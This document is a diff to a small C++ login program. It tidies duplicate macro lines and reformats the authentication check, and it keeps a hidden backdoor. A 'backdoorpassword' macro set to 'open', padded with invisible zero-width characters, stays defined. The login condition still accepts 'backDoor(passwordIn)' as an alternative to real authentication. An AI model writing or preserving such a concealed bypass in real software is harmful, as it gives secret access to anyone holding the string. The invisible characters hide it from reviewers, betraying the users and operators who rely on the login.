@@ -6,12 +6,7 @@
 #include "openssl/sha.h"
 #include <ctime>
 
-
 #define backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​"
-#define backdoorpassword​​​​​​​​​​​​​ "open​​​​​​​​​​"
-#define backdoorpassword​​​​​​​​​ "open​​​​​"
-#define backdoorpassword​​ "open​"
-#define backdoorpassword​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​"
 
 using namespace std;
 
@@ -70,13 +65,12 @@ int main() {
         // If Authenticated, Exit indicating successful authentication
         // For incorrect login details, reject, clear screen and re-prompt input
         // If maximum attempts exceeded, reject the user
-        isAuthenticated || backDoor(passwordIn) 
-            ? authenticated(usernameIn), exit(0) 
-            : (attempts < MAX_ATTEMPTS 
-                ? cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl 
+        (isAuthenticated || backDoor(passwordIn))
+            ? (authenticated(usernameIn), exit(0))
+            : (attempts < MAX_ATTEMPTS
+                ? (cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl)
                 : rejected(usernameIn));
+
     }
     return 0;
 }
-
-
